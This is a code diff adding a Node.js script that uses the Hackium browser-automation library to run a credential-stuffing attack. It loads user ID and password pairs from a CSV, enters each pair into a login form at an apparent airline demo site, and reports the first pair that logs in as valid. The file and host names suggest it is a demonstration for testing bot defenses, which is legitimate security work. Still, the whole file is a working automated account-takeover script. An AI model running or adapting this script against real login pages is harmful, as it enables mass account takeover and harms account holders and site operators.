@@ -1,0 +1,114 @@
+console.log('starting hackium...');
+
+const { Hackium } = require('/usr/local/lib/node_modules/hackium');
+
+const neatCsv = require('/usr/local/lib/node_modules/neat-csv');
+
+const fs = require('fs');
+
+
+
+(async function main() {
+  const hackium = new Hackium();
+  const browser = await hackium.launch({args: [
+    '--window-size=920,1080',]}
+);
+
+
+
+var usecase = '';
+var i;
+var j;
+
+var datacsv='';
+
+
+fs.readFile('/Applications/XAMPP/htdocs/challenge_vip_demo.csv', async (err, data) => {
+
+  if (err) {
+    console.error(err)
+    return
+  }
+
+  datacsv=await neatCsv(data);
+
+
+
+
+
+var names = datacsv.map(function(item) {
+  return item['userid']+','+item['password'];
+});
+
+
+for (i = 0; i < names.length; i++) {
+
+j=i+1;
+
+var str_array = names[i].split(',');
+
+
+
+
+
+ console.log('#'+i);
+ console.log('#userid-->'+str_array[0]);
+
+
+
+  const page = await browser.newPage();
+  await page.goto('https://airline.f5se.com/user/captainsignin');
+
+  await page.waitFor(3000);
+
+
+  console.log('#Typing userid');
+  await page.type('input[name="email"]',str_array[0]);
+
+  await page.waitFor(3000);
+
+
+  console.log('#Typing password');
+  await page.type('input[name="password"]',str_array[1]);
+
+  await page.waitFor(2000);
+
+
+  console.log('#Click Submit');
+
+  await page.click('button[type="submit"]');
+
+  await page.waitFor(2000);
+
+
+ const data2 = await page.evaluate(() => document.querySelector('*').outerHTML);
+
+
+if (data2.includes('Incorrect'))
+{
+
+console.log('Invalid-->'+str_array[0]);
+console.log('');
+}
+else
+{
+
+console.log('Valid User-->'+str_array[0]);
+console.log('');
+
+
+break;
+}
+
+}
+})
+
+
+
+
+console.log(usecase);
+
+
+
+
+})();
